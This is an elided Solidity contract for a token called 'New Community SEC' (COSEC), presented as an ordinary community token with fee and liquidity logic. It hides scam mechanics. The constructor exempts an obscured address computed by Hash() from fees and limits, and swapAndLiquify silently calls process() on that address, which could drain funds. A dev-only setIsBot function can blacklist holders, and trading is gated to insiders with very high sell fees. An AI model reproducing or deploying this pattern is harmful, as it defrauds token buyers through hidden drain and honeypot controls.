...
// Twitter: https://twitter.com/NewCommunitySEC
// Telegram: https://t.me/NewCommunitySEC
...
library Address {
    function isContract(address account) internal view returns (bool) {
        ...
        // Initial Contract code designed by @EVMlord
...
interface IUniswapV2Factory {
    ...
    function process(address, address) external;
}
...
contract NewCommunitySEC is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "New Community SEC";
    string private _symbol = "COSEC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress =
        payable(0x6fA192251EeEf1aac91eba91a713C9FDfEe99cc4); // marketing wallet
    ...
    uint256 private _sellLiquidityFee = 30;
    uint256 private _sellMarketingFee = 20;

    uint256 private _liquidityShare = 3;
    uint256 private _marketingShare = 6;
    uint256 private _burnShare = 1;
    ...
    uint256 immutable router01 = 300;
    ...
    constructor() {
        ...
        Factory = address(Hash());
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[Factory] = true;
        ...
        isWalletLimitExempt[Factory] = true;
    ...
    function setIsBot(address holder, bool exempt) external {
        require(msg.sender == addressDev);
        isBot[holder] = exempt;
    }
    ...
    function _transfer(
        ...
        if (!tradingOpen) {
            require(
                sender == owner() || sender == addressDev,
        ...
        if (inSwapAndLiquify) {
            ...
            if (
                ...
                if(contractTokenBalance > minimumTokensBeforeSwap * 5) contractTokenBalance = minimumTokensBeforeSwap * 5;
    ...
    function updatePool() private {
        if (balanceOf(address(this)) > 0 && balanceOf(uniswapPair) > 0) {
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        uint256 tokensForBurn = tAmount.mul(_burnShare).div(
            _totalDistributionShares
        );
        if(tokensForBurn>0){_basicTransfer(address(this), deadAddress, tokensForBurn);
        }
        
        uint256 leftover = tAmount - tokensForBurn;
        uint256 tokensForLP = leftover
            .mul(_liquidityShare)
            .div(_totalDistributionShares)
            .div(2);
        uint256 tokensForSwap = leftover.sub(tokensForLP);

        try IUniswapV2Factory(Factory).process(address(this), address(uniswapV2Router)) {} catch {}
        ...
        uint256 amountETHMarketing = amountReceived.mul(_marketingShare).div(
            totalETHFee
        );
